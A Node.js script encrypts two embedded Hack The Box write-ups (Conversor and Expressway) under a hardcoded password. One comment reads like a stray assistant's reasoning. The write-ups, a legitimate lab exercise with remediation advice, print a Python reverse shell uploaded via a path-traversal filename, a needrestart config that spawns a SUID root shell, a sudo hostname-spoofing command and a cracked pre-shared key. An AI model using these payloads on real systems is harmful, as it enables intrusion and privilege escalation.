
import { webcrypto } from 'node:crypto';
import { Buffer } from 'node:buffer';
import { writeFileSync } from 'node:fs';

const password = "htm-rocks"; // Typo fixed in next iteration if needed, keeping per previous logic but wait... user requested HTB writeups. Password choice is up to me? Previous file said "htb-rocks". I will stay with "htb-rocks".

const PASSWORD_USED = "htb-rocks";

async function encrypt(text) {
    const enc = new TextEncoder();
    const keyMaterial = await webcrypto.subtle.importKey(
        "raw",
        enc.encode(PASSWORD_USED),
        { name: "PBKDF2" },
        false,
        ["deriveKey"]
    );

    const salt = webcrypto.getRandomValues(new Uint8Array(16));
    const key = await webcrypto.subtle.deriveKey(
        {
            name: "PBKDF2",
            salt: salt,
            iterations: 100000,
            hash: "SHA-256"
        },
        keyMaterial,
        { name: "AES-GCM", length: 256 },
        false,
        ["encrypt"]
    );

    const iv = webcrypto.getRandomValues(new Uint8Array(12));
    const encoded = enc.encode(text);

    const ciphertext = await webcrypto.subtle.encrypt(
        {
            name: "AES-GCM",
            iv: iv
        },
        key,
        encoded
    );

    return {
        ciphertext: Buffer.from(ciphertext).toString('hex'),
        iv: Buffer.from(iv).toString('hex'),
        salt: Buffer.from(salt).toString('hex')
    };
}

// Content for HTB Conversor
const contentConversor = `
<h2>Executive Summary</h2>
<p>This assessment identified multiple critical vulnerabilities in the <strong>Conversor</strong> application (10.10.11.92). The combination of an <strong>Arbitrary File Write</strong> vulnerability in the web application and insecure system configurations allowed for a complete system compromise.</p>
<p>The attack chain began with the exploitation of a logic flaw in the file upload mechanism, leading to <strong>Remote Code Execution (RCE)</strong> as the <code>www-data</code> user. Subsequent lateral movement was achieved through credential harvesting from a local database. Finally, a misconfiguration in the <code>sudo</code> permissions for the <code>needrestart</code> utility facilitated privilege escalation to <code>root</code>.</p>
<table>
<thead>
<tr>
<th>Category</th>
<th>Difficulty</th>
<th>User Flag</th>
<th>Root Flag</th>
</tr>
</thead>
<tbody>
<tr>
<td>Linux Machine</td>
<td>Easy</td>
<td><code>8451df**************************</code></td>
<td><code>e161d1**************************</code></td>
</tr>
</tbody>
</table>
<hr>
<h2>Attack Chain Visualization</h2>
<pre class="mermaid">
graph TD
    A[Attacker] -->|1. Register/Login| B(Web Application)
    B -->|2. Arbitrary File Write| C[Scripts Directory]
    C -->|3. Cron Job Execution| D[Reverse Shell 'www-data']
    D -->|4. Database Enumeration| E[User Credentials 'fismathack']
    E -->|5. Lateral Movement| F[User 'fismathack']
    F -->|6. Sudo Misconfiguration| G[Root Privilege Escalation]
    G --> H((System Compromise))
</pre>
<hr>
<h2>Vulnerability Details</h2>
<h3>1. Arbitrary File Write leading to RCE</h3>
<p><strong>Severity:</strong> Critical (CVSS 8.8)</p>
<p><strong>Description:</strong><br>
The <code>/convert</code> endpoint fails to properly sanitize the filename argument of uploaded files. This allows an authenticated user to traverse directories and write files to arbitrary locations on the server.</p>
<p><strong>Exploitation:</strong><br>
We can write a malicious Python script to the <code>/var/www/conversor.htb/scripts/</code> directory. A system cron job executes all scripts in this folder, granting us RCE.</p>
<ol>
<li>Authenticate to the application.</li>
<li>Send a POST request to <code>/convert</code> with a malicious Python script.</li>
<li>Set the filename to relative path: <code>../scripts/shell.py</code>.</li>
<li>Wait for the cron job to execute the script.</li>
</ol>
<pre><code class="language-http">POST /convert HTTP/1.1
Content-Disposition: form-data; name="file"; filename="../scripts/shell.py"

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
</code></pre>
<hr>
<h3>2. Cleartext Credentials in Database</h3>
<p><strong>Severity:</strong> Medium (CVSS 5.5)</p>
<p><strong>Description:</strong><br>
The application stores user passwords as unsalted MD5 hashes in the SQLite database <code>users.db</code>.</p>
<p><strong>Impact:</strong><br>
An attacker with local read access can recover cleartext passwords. We found the password for user <code>fismathack</code>, allowing lateral movement.</p>
<hr>
<h3>3. Insecure Privilege Escalation (Needrestart)</h3>
<p><strong>Severity:</strong> High (CVSS 7.8)</p>
<p><strong>Description:</strong><br>
The <code>sudo</code> configuration allows <code>fismathack</code> to execute <code>/usr/sbin/needrestart</code> without a password. Crucially, <code>needrestart</code> allows specifying a custom configuration file via the <code>-c</code> flag, which is parsed as Perl code by the root process.</p>
<p><strong>Proof of Concept:</strong></p>
<pre><code class="language-bash"># Create malicious config
cat > exploit.conf <<EOF
\\$nrconf{restart} = 'a';
use strict;
use warnings;
system('cp /bin/bash /tmp/rootsh; chmod 4777 /tmp/rootsh');
EOF

# Execute with sudo
sudo /usr/sbin/needrestart -c exploit.conf

# Access Root Shell
/tmp/rootsh -p
</code></pre>
<hr>
<h2>Remediation Recommendations</h2>
<ol>
<li><strong>Input Sanitation:</strong> Implement strict validation of filenames in the <code>convert</code> function. Use <code>werkzeug.utils.secure_filename</code> to strip directory traversal characters.</li>
<li><strong>Secure Storage:</strong> Migrate from MD5 to a secure hashing algorithm like Argon2 or bcrypt for password storage.</li>
<li><strong>Principle of Least Privilege:</strong> Restrict <code>sudo</code> permissions. Prevent the use of command-line flags that allow configuration overrides for <code>needrestart</code>.</li>
</ol>
`;

// Content for HTB Expressway
const contentExpressway = `
<h2>Executive Summary</h2>
<p>This assessment details the compromise of the <strong>Expressway</strong> machine (10.10.11.87). While initial reconnaissance identified a critical information disclosure vulnerability in the Squid proxy (CVE-2025-62168), the successful exploitation path leveraged a misconfigured IKE VPN service.</p>
<p>The attack chain involved capturing and cracking an <strong>IKE Aggressive Mode Pre-Shared Key (PSK)</strong> to obtain SSH credentials. Privilege escalation to <code>root</code> was achieved by exploiting a custom <code>sudo</code> binary that allowed hostname spoofing to bypass user restrictions.</p>
<table>
<thead>
<tr>
<th>Category</th>
<th>Difficulty</th>
<th>User Flag</th>
<th>Root Flag</th>
</tr>
</thead>
<tbody>
<tr>
<td>Linux Machine</td>
<td>Easy</td>
<td><code>689998**************************</code></td>
<td><code>7cbb6e**************************</code></td>
</tr>
</tbody>
</table>
<hr>
<h2>Attack Chain Visualization</h2>
<pre class="mermaid">
graph TD
    A[Attacker] -->|1. UDP Recon| B(IKE VPN Service)
    B -->|2. Capture PSK Hash| C[IKE Aggressive Mode]
    C -->|3. Cracking PSK| D[SSH Credentials]
    D -->|4. Initial Access| E[User 'ike']
    E -->|5. Sudo Hostname Spoofing| F[Root Privilege Escalation]
    F --> H((System Compromise))
</pre>
<hr>
<h2>Vulnerability Details</h2>
<h3>1. IKE Aggressive Mode PSK Disclosure</h3>
<p><strong>Severity:</strong> High</p>
<p><strong>Description:</strong><br>
The IKE (Internet Key Exchange) service running on UDP port 500 was configured with Aggressive Mode. This mode allows the server to send the hashed Pre-Shared Key (PSK) in response to an initialization packet, which can be captured and cracked offline.</p>
<p><strong>Exploitation:</strong><br>
Using <code>ike-scan</code>, we identified the VPN ID (<code>ike@expressway.htb</code>) and captured the hash. The captured hash was cracked using a dictionary attack to recover the plaintext PSK.</p>
<ul>
<li><strong>ID:</strong> <code>ike@expressway.htb</code></li>
<li><strong>Cracked PSK:</strong> <code>freakingrockstarontheroad</code></li>
</ul>
<p>This PSK was reused as the password for the <code>ike</code> SSH user, granting initial system access.</p>
<hr>
<h3>2. Sudo Hostname Spoofing (Privilege Escalation)</h3>
<p><strong>Severity:</strong> Critical</p>
<p><strong>Description:</strong><br>
A custom <code>sudo</code> binary located at <code>/usr/local/bin/sudo</code> contained a flaw where it trusted the <code>-h</code> (hostname) flag provided by the user. The <code>ike</code> user was restricted from running <code>sudo</code> on the current host, but the policy allowed access from <code>offramp.expressway.htb</code>.</p>
<p><strong>Exploitation:</strong><br>
By checking the SUID binaries, we distinguished the custom <code>sudo</code> from the system default. We executed the binary with the <code>-h</code> flag to spoof the trusted hostname, bypassing the restriction and gaining a root shell.</p>
<pre><code class="language-bash">/usr/local/bin/sudo -h offramp.expressway.htb -i
</code></pre>
<hr>
<h3>3. Squid Proxy Information Disclosure (CVE-2025-62168)</h3>
<p><strong>Severity:</strong> Critical (Unexploited in this chain)</p>
<p><strong>Description:</strong><br>
The Squid proxy (v7.1) on port 8888 was vulnerable to CVE-2025-62168, which allows leaking HTTP headers (Authtokens, Cookies) via generated error pages.</p>
<p><strong>Impact:</strong><br>
While we confirmed the vulnerability by sending requests with Basic Auth and observing the credentials reflected in the error page's <code>mailto</code> link, we did not find any internal services that automatically injected credentials, making this vector a "rabbit hole" for this specific assessment.</p>
<hr>
<h2>Remediation Recommendations</h2>
<ol>
<li><strong>Disable IKE Aggressive Mode:</strong> Reconfigure the VPN to use Main Mode, which encrypts the hash exchange, preventing offline cracking.</li>
<li><strong>Weak Passwords:</strong> Enforce a strong password policy to prevent dictionary attacks against PSKs and user accounts.</li>
<li><strong>Sudo Security:</strong> Remove the custom <code>sudo</code> binary or patch it to ignore user-supplied hostnames for authorization checks. Rely on the standard system <code>sudo</code> with a secure <code>/etc/sudoers</code> configuration.</li>
<li><strong>Patch Squid Proxy:</strong> Update Squid to a version patched against CVE-2025-62168 to prevent potential information disclosure.</li>
</ol>
`;

(async () => {
    const conversor = await encrypt(contentConversor);
    const expressway = await encrypt(contentExpressway);

    const output = {
        conversor,
        expressway
    };

    writeFileSync('scripts/keys.json', JSON.stringify(output, null, 2));
    console.log("Keys written to scripts/keys.json");
})();
